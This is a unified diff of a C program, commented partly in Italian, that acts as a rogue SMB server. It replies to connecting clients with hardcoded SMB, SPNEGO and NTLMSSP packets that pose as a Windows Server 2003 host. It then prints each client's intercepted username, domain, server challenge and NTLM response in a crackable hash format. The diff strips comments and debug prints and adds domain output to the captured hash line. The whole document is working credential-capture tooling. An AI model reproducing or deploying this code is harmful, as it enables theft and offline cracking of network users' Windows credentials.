@@ -21,10 +21,10 @@ size_t port = SERVER_PORT;
 const char nt_lm_012[] = "NT LM 0.12";
 
 const unsigned char negotiate_resp_tmpl[] = {
-    // NBT Header (4 bytes) 
+    // NBT Header 
     0x0, 0x0, 0x0, 0x90, 
     
-    // SMB Header & Parameters 
+    // SMB Header and Parameters 
     0xff, 0x53, 0x4d, 0x42, 0x72, 0x0, 0x0, 0x0, 0x0, 0x88, 0x1, 0xc8, 
     0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 
     0x0, 0xfe, 0xff, 0x0, 0x0, 0x0, 0x0, 0x11, 0x1, 0x0, 0x3, 0x32, 0x0, 
@@ -35,38 +35,37 @@ const unsigned char negotiate_resp_tmpl[] = {
     // SMB ByteCount
     0x4b, 0x0, 
     
-    // Server GUID (16 bytes)
+    // Server GUID 
     0x3f, 0x62, 0x2a, 0x4e, 0x49, 0xca, 0x66, 0xde, 0xdf, 0x64, 0xd8, 
     0xaa, 0xbc, 0x2a, 0xc, 0x89, 
     
     // SPNEGO ASN.1 Blob (Solo NTLMSSP)
-    0x60, 0x39,                         // Application 0, lunghezza 59
-    0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02, // OID: SPNEGO
-    0xa0, 0x2f,                         // Context 0 (NegTokenInit), lunghezza 47
-    0x30, 0x2d,                         // Sequence, lunghezza 45
-    0xa0, 0x0e,                         // Context 0 (mechTypes), lunghezza 14
-    0x30, 0x0c,                         // Sequence OF, lunghezza 12
+    0x60, 0x39,                         
+    0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02,
+    0xa0, 0x2f,                         
+    0x30, 0x2d,                         
+    0xa0, 0x0e,                         
+    0x30, 0x0c,  
+
     // INIZIO OID NTLMSSP
     0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, 
-    // FINE OID NTLMSSP
     
     // Stringa / Metadata Finale
-    0xa3, 0x1b,                         // Context 3, lunghezza 27
-    0x30, 0x19, 0xa0, 0x17, 0x1b, 0x15, // Sequence e GeneralString lunghezze
+    0xa3, 0x1b,                         
+    0x30, 0x19, 0xa0, 0x17, 0x1b, 0x15, 
     0x36, 0x38, 0x51, 0x4d, 0x36, 0x56, 0x4a, 0x49, 0x38, 0x24, 0x40, 
     0x38, 0x4e, 0x49, 0x49, 0x2e, 0x4c, 0x4f, 0x43, 0x41, 0x4c // "68QJM6VJI8$@8NII.LOCAL"
 };
 
 const unsigned char session_setup_challenge_tmpl[] = {
-    // NBT Header (4 bytes): Session Message, lunghezza SMB = 0x01a4 = 420
+    // NBT Header 
     0x0, 0x0, 0x1, 0xa4,
 
-    // *** SMB Header (32 bytes) ***
-    // Protocol Magic: \xffSMB
+    // SMB Header \xffSMB
     0xff, 0x53, 0x4d, 0x42,
     // Command: SMB_COM_SESSION_SETUP_ANDX (0x73)
     0x73,
-    // NT Status: 0xc0000016 = STATUS_MORE_PROCESSING_REQUIRED (challenge in corso)
+    // NT Status
     0x16, 0x0, 0x0, 0xc0,
     // Flags
     0x88,
@@ -74,99 +73,76 @@ const unsigned char session_setup_challenge_tmpl[] = {
     0x1, 0xc8,
     // PID High
     0x0, 0x0,
-    // Security Signature (non utilizzata)
+    // Security Signature
     0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
     // Reserved
     0x0, 0x0,
     // TID
     0x0, 0x0,
-    // PID copiare dal request del client. Offset 30
+    // PID
     0x94, 0x31,
     // UID assegnare UID di sessione
     0xbe, 0x87,
     // MID copiare dal request del client
     0x1, 0x0,
 
-    // *** Session Setup AndX Response Parameters (WordCount = 4) ***
+    // Session Setup AndX Response Parameters
     0x4,
     // AndXCommand: 0xFF (nessun comando concatenato)
     0xff,
     // AndXReserved
     0x0,
-    // AndXOffset: 0x01a4 (punta alla fine del pacchetto)
+    // AndXOffset
     0xa4, 0x1,
-    // Action: 0x0000 (login standard, non guest)
+    // Action
     0x0, 0x0,
-    // SecurityBlobLength: 0x00f9 = 249
+    // SecurityBlobLength
     0xf9, 0x0,
-
-    // ByteCount: 0x0179 = 377 (SecurityBlob + NativeOS + NativeLanMan)
+    // ByteCount
     0x79, 0x1,
 
-    // *** SecurityBlob: SPNEGO NegTokenResp (249 bytes) ***
-    // [a1] Context NegTokenResp, lunghezza 246
+    // SecurityBlo SPNEGO NegTokenResp 
     0xa1, 0x81, 0xf6,
-    // SEQUENCE, lunghezza 243
     0x30, 0x81, 0xf3,
-    // [a0] negState = accept-incomplete (serve un altro round-trip)
     0xa0, 0x3, 0xa, 0x1, 0x1,
-    // [a1] supportedMech: OID NTLMSSP (1.3.6.1.4.1.311.2.2.10)
+    // supportedMech OID NTLMSSP (1.3.6.1.4.1.311.2.2.10)
     0xa1, 0xc, 0x6, 0xa, 0x2b, 0x6, 0x1, 0x4, 0x1, 0x82, 0x37, 0x2, 0x2, 0xa,
-    // [a2] responseToken (OCTET STRING, 218 bytes)
     0xa2, 0x81, 0xdd,
     0x4, 0x81, 0xda,
 
-    // *** NTLMSSP CHALLENGE MESSAGE (218 bytes) ***
-    // Signature: "NTLMSSP\0"
+    // NTLMSSP CHALLENGE MESSAGE 
     0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x0,
-    // MessageType: 2 (Challenge)
     0x2, 0x0, 0x0, 0x0,
-    // TargetName: { Len=8, MaxLen=8, Offset=56 }
     0x8, 0x0, 0x8, 0x0, 0x38, 0x0, 0x0, 0x0,
-    // NegotiateFlags: 0xe2898215
     0x15, 0x82, 0x89, 0xe2,
-    // ServerChallenge (8 bytes) 
-    // Offset nel pacchetto finale: 102 (0x66)
     0xc4, 0xba, 0x87, 0xa2, 0x65, 0xde, 0x9e, 0x9,
-    // Reserved
     0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
-    // TargetInfo: { Len=154, MaxLen=154, Offset=64 }
     0x9a, 0x0, 0x9a, 0x0, 0x40, 0x0, 0x0, 0x0,
-    // Version: 5.2 build 3790, NTLMRevision=15 (Windows Server 2003 SP2)
     0x5, 0x2, 0xce, 0xe, 0x0, 0x0, 0x0, 0xf,
 
-    // *** Payload NTLMSSP ***
-    // TargetName Data: "8NII" (UTF-16LE, 8 bytes)
+    // Payload NTLMSSP 
     0x38, 0x0, 0x4e, 0x0, 0x49, 0x0, 0x49, 0x0,
-
-    // TargetInfo Attribute-Value Pairs (154 bytes totali)
-    // MsvAvNbDomainName  (type=2, len=8):  "8NII"
     0x2, 0x0, 0x8, 0x0,
     0x38, 0x0, 0x4e, 0x0, 0x49, 0x0, 0x49, 0x0,
-    // MsvAvNbComputerName (type=1, len=30): "WIN-1FX4UMPS4TB"
     0x1, 0x0, 0x1e, 0x0,
     0x57, 0x0, 0x49, 0x0, 0x4e, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x46, 0x0,
     0x58, 0x0, 0x34, 0x0, 0x55, 0x0, 0x4d, 0x0, 0x50, 0x0, 0x53, 0x0,
     0x34, 0x0, 0x54, 0x0, 0x42, 0x0,
-    // MsvAvDnsDomainName  (type=4, len=52): "WIN-1FX4UMPS4TB.8NII.LOCAL"
     0x4, 0x0, 0x34, 0x0,
     0x57, 0x0, 0x49, 0x0, 0x4e, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x46, 0x0,
     0x58, 0x0, 0x34, 0x0, 0x55, 0x0, 0x4d, 0x0, 0x50, 0x0, 0x53, 0x0,
     0x34, 0x0, 0x54, 0x0, 0x42, 0x0, 0x2e, 0x0, 0x38, 0x0, 0x4e, 0x0,
     0x49, 0x0, 0x49, 0x0, 0x2e, 0x0, 0x4c, 0x0, 0x4f, 0x0, 0x43, 0x0,
     0x41, 0x0, 0x4c, 0x0,
-    // MsvAvDnsComputerName (type=3, len=20): "8NII.LOCAL"
     0x3, 0x0, 0x14, 0x0,
     0x38, 0x0, 0x4e, 0x0, 0x49, 0x0, 0x49, 0x0, 0x2e, 0x0, 0x4c, 0x0,
     0x4f, 0x0, 0x43, 0x0, 0x41, 0x0, 0x4c, 0x0,
-    // MsvAvDnsTreeName    (type=5, len=20): "8NII.LOCAL"
     0x5, 0x0, 0x14, 0x0,
     0x38, 0x0, 0x4e, 0x0, 0x49, 0x0, 0x49, 0x0, 0x2e, 0x0, 0x4c, 0x0,
     0x4f, 0x0, 0x43, 0x0, 0x41, 0x0, 0x4c, 0x0,
-    // MsvAvEOL (type=0)
     0x0, 0x0, 0x0, 0x0,
 
-    // *** NativeOS (UTF-16LE, null-term.): "Windows Server 2003 3790 Service Pack 2"
+    // NativeOS
     0x57, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x6f, 0x0, 0x77, 0x0,
     0x73, 0x0, 0x20, 0x0, 0x53, 0x0, 0x65, 0x0, 0x72, 0x0, 0x76, 0x0,
     0x65, 0x0, 0x72, 0x0, 0x20, 0x0, 0x32, 0x0, 0x30, 0x0, 0x30, 0x0,
@@ -175,7 +151,7 @@ const unsigned char session_setup_challenge_tmpl[] = {
     0x63, 0x0, 0x65, 0x0, 0x20, 0x0, 0x50, 0x0, 0x61, 0x0, 0x63, 0x0,
     0x6b, 0x0, 0x20, 0x0, 0x32, 0x0, 0x0, 0x0,
 
-    // *** NativeLanMan (UTF-16LE, null-term.): "Windows Server 2003 5.2"
+    // NativeLanMan
     0x57, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x6f, 0x0, 0x77, 0x0,
     0x73, 0x0, 0x20, 0x0, 0x53, 0x0, 0x65, 0x0, 0x72, 0x0, 0x76, 0x0,
     0x65, 0x0, 0x72, 0x0, 0x20, 0x0, 0x32, 0x0, 0x30, 0x0, 0x30, 0x0,
@@ -340,7 +316,6 @@ static int client_flush_tx(client_t *client) {
 
         if (n > 0) {
             // Abbiamo inviato n byte.
-            //printf("Inviati %d bytes\n", n);
             client->tx_off += (size_t)n;
             continue;
         }
@@ -379,13 +354,11 @@ static int client_read_rx(client_t *client) {
 
     if (n > 0) {
         client->rx_len += (size_t)n;
-        //printf("[*] Client sent %d bytes: %s\n", n, client->client_ip);
         return 0;
     }
 
     if (n == 0) {
         // Il client ha chiuso la connessione.
-        //printf("[-] Client disconnected: %s\n", client->client_ip);
         return -1;
     }
 
@@ -399,7 +372,6 @@ static int client_read_rx(client_t *client) {
         return 0;
     }
 
-    //printf("[-] Client disconnected: %s\n", client->client_ip);
     return -1;
 }
 
@@ -408,22 +380,6 @@ static void set_dialect_index(uint8_t *buffer, uint16_t dialect_index) {
     buffer[37] = dialect_index & 0xFF;         // LSB
     buffer[38] = (dialect_index >> 8) & 0xFF;  // MSB
 }
-
-// Modifica la Security Mode (es. per disabilitare SMB Signing)
-static void set_security_mode(uint8_t *buffer, uint8_t sec_mode) {
-    // Il Security Mode si trova all'offset 39
-    buffer[39] = sec_mode;
-}
-
-// Modifica le Capabilities (es. per disabilitare Extended Security)
-static void set_capabilities(uint8_t *buffer, uint32_t caps) {
-    // Le Capabilities (4 byte, Little-Endian) iniziano all'offset 57
-    buffer[57] = caps & 0xFF;
-    buffer[58] = (caps >> 8) & 0xFF;
-    buffer[59] = (caps >> 16) & 0xFF;
-    buffer[60] = (caps >> 24) & 0xFF;
-}
-
 
 // Callback for ASN.1 logging
 void asn1_logger(size_t ident, const char *format, va_list args) {
@@ -460,7 +416,6 @@ static int client_process_smb_msg(client_t *client) {
         ret = -1;
         goto cleanup_1;       
     }
-    //printf("[+] Ricevuto pacchetto SMB con comando: 0x%02x\n", parsed.header.command);
 
     // In base allo stato del client processiamo il messaggio
     // - ogni stato deve inviare la risposta e aggiornare stato
@@ -626,7 +581,6 @@ static int client_process_smb_msg(client_t *client) {
             }
             
             parse_ntlm_msg(&ntlm_ctx, &ntlm_msg);
-            //dump_msg(&ntlm_msg); // Print NTLM details to screen 
 
             printf("[INTERCEPTED] Username: ");
             dump_utf16_le_string(
@@ -652,6 +606,14 @@ static int client_process_smb_msg(client_t *client) {
                 ntlm_msg.payload.ntlm_authenticate_msg_payload.username.len, 0
             );
             printf("::");
+
+            dump_utf16_le_string(
+                ntlm_msg.payload.ntlm_authenticate_msg_payload.domain_name.data,
+                ntlm_msg.payload.ntlm_authenticate_msg_payload.domain_name.len, 0
+            );
+
+            printf(":");
+
             for (size_t i = 0; i < sizeof(challenge); i++) {
                 printf("%02x", challenge[i]);
             }
@@ -663,6 +625,14 @@ static int client_process_smb_msg(client_t *client) {
                 &ntlm_msg.payload.ntlm_authenticate_msg_payload.nt_challenge_response,
                 &resp
             );
+
+            if (err != NTLM_PARSER_OK) {
+                free_ntlm_msg(&ntlm_msg);
+                free(spnego_token);
+                asn1_tree_free(&tree);
+                ret = -1;
+                goto cleanup_2; 
+            }
 
             for (size_t i = 0; i < sizeof(resp.response); i++) {
                 printf("%02x", resp.response[i]);
@@ -901,10 +871,6 @@ static void start_server(int listen_fd, client_t *clients, struct pollfd *pfds) 
 
         }
     }
-
-    // Free the remaining structures
-    // ...
-
 }
 
 
